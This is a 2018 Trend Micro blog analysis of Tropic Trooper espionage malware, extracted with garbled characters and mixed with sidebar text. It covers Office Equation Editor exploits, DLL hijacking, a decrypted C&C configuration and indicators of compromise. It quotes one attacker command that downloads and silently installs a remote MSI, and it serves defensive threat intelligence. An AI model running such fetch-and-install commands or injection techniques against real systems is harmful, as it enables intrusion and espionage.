@@ -1,0 +1,292 @@
+Trend Micro 
+About TrendLabs Security Intelligence Blog 
+
+HomeCategoriesSearch:Tropic Trooper’s New Strategy 0 Posted on: March 14, 2018 
+at 7:01 am Posted in: Exploits, Malware, Targeted Attacks 
+Author: 
+Trend Micro 
+
+
+Tropic Trooper (also known as KeyBoy) levels its campaigns against Taiwanese, Philippine, andHong Kong targets, focusing on their government, healthcare, transportation, and high-techindustries. Its operators are believed to be very organized and develop their own cyberespionagetools that they .ne-tuned in their recent campaigns. Many of the tools they use now feature newbehaviors, including a change in the way they maintain a foothold in the targeted network. 
+Attack Chain 
+Figure 1. Attack chain of Tropic Trooper’s operations 
+Here’s a summary of the attack chain of Tropic Trooper’s recent campaigns: 
+1. 
+Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security .aws inMicrosoft Of.ce’s Equation Editor (EQNEDT32.EXE). 
+
+2. 
+Download an installer package (.msi) and install it on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]). 
+
+3. 
+This system con.guration .le (in.sys) will drop a backdoor installer (UserInstall.exe) then deleteitself. The backdoor installer will drop a normal sidebar.exe .le (a Windows Gadget tool, a feature already discontinued by Windows), a malicious loader (in“C:\ProgramData\Apple\Update\wab32res.dll“), and an encrypted con.guration .le.UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launchsidebar.exe. 
+
+4. 
+The malicious loader will use dynamic-link library (DLL) hijacking — injecting malicious codeinto a process of a .le/application — on sidebar.exe and launch dllhost.exe (a normal .le). Theloader will then inject a DLL backdoor into dllhost.exe. We also observed malicious documents that don’t need to download anything from the internet asthe backdoor’s dropper is already embedded in the document. This, however, doesn’t in.uence theoverall result for the victim. 
+
+
+The backdoor will load the encrypted con.guration .le and decrypt it, then use Secure SocketsLayer (SSL) protocol to connect to command-and-control (C&C) servers. 
+Featured Stories 
+
+systemd
+ Vulnerability Leadsto Denial of Service on 
+Linux 
+
+
+
+qkG
+ Filecoder: Self-Replicating, Document-Encrypting RansomwareMitigating CVE-2017-5689,an Intel Management EngineVulnerability
+
+
+A
+ Closer Look at North 
+Korea’s Internet 
+
+
+
+From
+ Cybercrime toCyberpropaganda 
+
+
+Security Predictions for 2018 
+
+
+Attackers
+ are banking onnetwork vulnerabilities and inherent weaknesses to facilitate massive malware attacks, IoT hacks, and operational disruptions. Theever-shifting threats andincreasingly expandingattack surface will challengeusers and enterprises to catchup with their security.
+
+
+
+Read our security predictionsfor 2018. 
+
+Business Process Compromise 
+
+Attackers are starting toinvest in long-termoperations that target speci.cprocesses enterprises rely on.They scout for vulnerablepractices, susceptiblesystems and operationalloopholes that they canleverage or abuse. To learn more, read our Security 101:Business Process 
+Compromise. 
+
+Latest Ransomware Posts Tropic Trooper uses exploit-laden Microsoft Of.ce documents to deliver malware to targets. Thesedocuments use job vacancies in organizations that may be deemed socio-politically sensitive torecipients. Below is a screenshot of the document used in their latest campaigns: 
+
+
+
+Figure 2. Malicious document used by Tropic TrooperPDB Strings as Context Clues
+The MSI .le has two program database (PDB) strings inside: one belonging to the MSI .le, andanother for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB). 
+Figure 3. PDB strings inside the MSI .leThe .rst PDB string has a certain ss2/Projects/MsiWrapper (Project MsiWrapper) in it, which wefound to be an open-source application that converts executable setup programs to MSI .les. Thesecond PDB string contains Work, House, and TSSL: we can assume this tool belongs to TropicTrooper’s TSSL project as seen by other researchers. Here it is a new one, as seen in theirmisspelling of “Horse” to “House” (other reports had the string typed correctly). 
+Another interesting PDB string we found isD:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb. At installation, the MSI .le drops three .les and creates one hidden directory (UFile) intoC:\ProgramData\Apple\Update\, likely as a ruse. 
+It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) throughDLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign .le. 
+Figure 4. The installer drops three .les into the Apple/Update directory 
+Figure 5. PDB strings inside the loader .le 
+From the PDB string above, the attackers intended it to be a loader (hence the name FakeRun) andnot the actual backdoor. FakeRun’s PDB string(D:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL .le, which is the backdoor, into this process. Thebackdoor, TClient (BKDR_TCLT.ZDFB), is so named from its own PDB string. 
+Digital Extortion: A Forward-looking View 
+
+qkG Filecoder: Self-Replicating, Document-Encrypting Ransomware 
+
+Bad Rabbit Ransomware 
+Spreads via Network, Hits 
+Ukraine and Russia 
+
+A Look at Locky 
+Ransomware’s Recent Spam 
+Activities 
+
+Magnitude Exploit Kit Now 
+Targeting South Korea With 
+Magniber Ransomware 
+
+Recent Posts 
+Tropic Trooper’s New
+Strategy March Patch TuesdayFixes 75 Security Issues,Drops Registry KeyRequirement in Windows10 
+
+Detecting Attacks thatExploit Meltdown andSpectre with PerformanceCounters 
+
+Campaign PossiblyConnected to 
+“MuddyWater” Surfacesin the Middle East and 
+Central Asia 
+
+Cryptocurrency-MiningMalware: 2018’s New 
+Menace? 
+
+Ransomware 101 
+
+
+This infographic shows howransomware has evolved, how big the problem hasbecome, and ways to avoidbeing a ransomware victim.
+Check the infographic 
+
+Popular Posts 
+Homemade Browser 
+Targeting Banco do BrasilUsers 
+Vulnerabilities in ApacheCouchDB Open the Door toMonero Miners 
+
+
+Figure 6. TClient is injected into dllhost.exe 
+Malware Analysis
+wab32res.dll (FakeRun loader) loads TClient. Once the loader is executed, it will check the currentprocess (sidebar.exe) whether to load it or not. Successfully checking the loader will execute thedllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as there can be multiple instances of it depending on the number of programs using the Internet 
+Information Services. 
+
+Figure 7. The loader checking the sidebar process 
+Figure 8. The malicious loader injecting the backdoor into dllhost.exe 
+Figure 9. Comparison of TClient’s con.guration format in 2016 (left, from other researchers) and 
+2018 (right) 
+TClient will use SSL to connect to Tropic Trooper’s C&C server. However, the C&C server andsome con.guration values are not hardcoded in the backdoor. This allows Tropic Trooper’soperators to easily change/update the C&C server and con.gure other values. 
+TClient is actually one of Tropic Trooper’s other backdoors. The backdoor noted by other securityresearchers was encoded with different algorithms and con.gured with different parameter namesin 2016, for instance. TClient uses symmetric encryption to decrypt its con.guration with one 16-byte key in 2018. The image and table below illustrate TClient’s encrypted con.guration that wedecrypted (via Python code): Oracle Server VulnerabilityExploited to Deliver DoubleMonero Miner Payloads 
+Cryptocurrency-MiningMalware: 2018’s New 
+Menace? 
+New AndroRAT ExploitsDated Privilege EscalationVulnerability, AllowsPermanent Rooting 
+
+Stay Updated 
+Email Subscription 
+
+Figure 10. Snapshot of code we used to decrypt TClient’s con.guration 
+Figure 11. Encrypted backdoor con.guration 
+Description Decryption Strings
+Check code MDDEFGEGETGIZAddr1: tel.qpoe[.]comAddr2: elderscrolls.wikaba[.]comAddr3: tel.qpoe[.]comPort1: 443Port2: 443Port3: 53LoginPasswd: someoneHostMark: markProxy: 0 
+Figure 12. Decrypted backdoor con.guration 
+Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClientwill use custom SSL libraries to connect the C&C server. We also found another SSL certi.cate on this C&C server. A closer look reveals that it was registered quite recently, and is set to expire aftera year, suggesting Tropic Trooper’s use or abuse of components or services that elapse so they canleave as few traces as possible. 
+Figure 13. SSL certi.cate’s validity 
+Following Tropic Trooper’s Trails.
+We further monitored their activities and found three additional and notable PDB strings in theirmalware: 
+
+D:\Work\Project\VS\HSSL\HSSL_Unicode _2\Release\ServiceClient.pdbD:\Work\VS\Horse\TSSL\TSSL_v3.0\TClient\Release\TClient.pdbD:\Work\VS\Horse\TSSL\TSSL_v0.3.1_20170722\TClient\x64\Release\TClient.pdbThese came from open-intelligence platforms and incident response cases. These strings shedfurther light on Tropic Trooper’s operations: 
+
+
+
+They
+ have another campaign/project named HSSL, which supports Unicode characters.
+
+
+The
+ TSSL project has a v3.0 version, indicating the operators can mix and match different versionsof their malware, depending on their target.
+
+
+The
+ TSSL project has 64-bit version.
+
+
+The Need for a Proactive Incident Response Strategy
+Cyberespionage campaigns are persistent and, as shown by Tropic Trooper, always raring to exploitweaknesses in people and technology. For organizations, this highlights the signi.cance of stayingahead of their attackers: detect, analyze, and respond. What techniques will they use? How can myorganization’s attack surface be reduced? What did I do to respond to the threat — what worked,what didn’t, and what could be .ne-tuned? 
+A proactive incident response strategy provides threat intelligence — from the endpoint to thenetwork — that can let IT/system administrators identify malicious activities that aren’t typicallyvisible to traditional security solutions. 
+TClient, for instance, uses DLL hijacking and injection that may not be as noticeable to others. Itsuse of the SSL protocol also means it can blend with legitimate traf.c. Analyzing their PDB stringscan also provide a deeper insight into the campaign’s bigger picture. Ascertaining the tactics andtechniques they use empower organizations in developing robust and actionable indicators ofcompromise (IoCs) that can act as benchmarks for response. 
+Here are some best practices that organizations can adopt: 
+
+Keep
+ the system, its applications, and the network updated. The vulnerabilities that TropicTrooper’s campaigns have been patched last January, for instance. Enforce a stronger patch 
+management policy, and consider virtual patching for legacy systems.
+
+
+Enforce
+ the principle of least privilege: Employ network segmentation and data categorization to deter lateral movement and mitigate further exposure. Application control and behavior monitoringblock suspicious .les and anomalous routines from being installed or executed in the system.
+
+
+Disable
+ or secure the use of system administration tools such as PowerShell and other command-line tools that may be abused.
+
+
+Actively
+ monitor your perimeter, from gateways and endpoints to networks and servers. Firewalls 
+as well as intrusion detection and prevention systems help thwart network-based attacks.
+
+
+Nurture
+ a culture of cybersecurity. Spear-phishing emails, for instance, rely on baiting targets withsocially engineered documents. The technologies that help protect the organization are only as goodas the people who use them.
+
+
+Indicators of Compromise (IoCs):
+Related Hashes (SHA-256):
+Detected as CVE-2018-0802.ZTFC: 
+
+1d128fd61c2c121d9f2e1628630833172427e5d486cdd4b6d567b7bdac13935e BKDR_TCLT.ZDFB: 
+
+01087051f41df7bb030256c97497f69bc5b5551829da81b8db3f46ba622d8a69 BKDR64_TCLT.ZTFB: 
+
+6e900e5b6dc4f21a004c5b5908c81f055db0d7026b3c5e105708586f85d3e334 TROJ_SCLT.ZTFB: 
+
+49df4fec76a0ffaee5e4d933a734126c1a7b32d1c9cb5ab22a868e8bfc653245 TROJ_TCDROP.ZTFB: 
+
+b0f120b11f727f197353bc2c98d606ed08a06f14a1c012d3db6fe0a812df528a d65f809f7684b28a6fa2d9397582f350318027999be3acf1241ff44d4df36a3a 85d32cb3ae046a38254b953a00b37bb87047ec435edb0ce359a867447ee30f8b TROJ_TCLT.ZDFB: 
+
+
+
+02281e26e89b61d84e2df66a0eeb729c5babd94607b1422505cd388843dd5456 fb9c9cbf6925de8c7b6ce8e7a8d5290e628be0b82a58f3e968426c0f734f38f6 
+
+URLs related to C&C communication: 
+
+qpoe[.]comwikaba[.]comtibetnews[.]todaydns-stuff[.]com2waky[.]com 
+
+
+
+
+Related Posts: 
+
+ChessMaster’s New Strategy: Evolving Tools and Tactics
+
+Winnti
+ Abuses GitHub for C&C Communications 
+
+
+
+Cerber
+ Starts Evading Machine Learning
+
+
+SYSCON
+ Backdoor Uses FTP as a C&C Channel 
+
+
+
+
+Learn how to protect Enterprises, Small Businesses, and Home Users from ransomware: 
+ENTERPRISE 
+. SMALL BUSINESS 
+. HOME 
+. 
+Tags: CVE-2017-11882 
+CVE-2018-0802 
+KeyBoy 
+Operation Tropic Trooper 
+tropic trooper 
+
+0 Comments TrendLabs 
+1 Login 
+
+. Recommend .Share Sort by Best 
+
+
+Start the discussion… 
+LOG IN WITH 
+OR SIGN UP WITH DISQUS 
+
+
+Name 
+
+. 
+Subscribe 
+d 
+Add 
+Disqus 
+to 
+your 
+siteAdd 
+DisqusAdd 
+% 
+Privacy 
+
+Home and Home Of.ce 
+
+|
+For Business 
+
+|
+Security Intelligence
+|
+About Trend Micro 
+
+Asia Paci.c Region (APAC): Australia / New Zealand, 中国, 日本, ...., 台灣 
+
+Latin America Region (LAR): Brasil, México 
+
+North America Region (NABU): United States, Canada 
+
+Europe, Middle East, & Africa Region (EMEA): France, Deutschland / .sterreich / Schweiz, Italia, Россия, Espa.a, United Kingdom / Ireland 
+
+Privacy Statement 
+Legal Policies 
+Copyright . 2018 Trend Micro Incorporated. All rights reserved. 
+
+
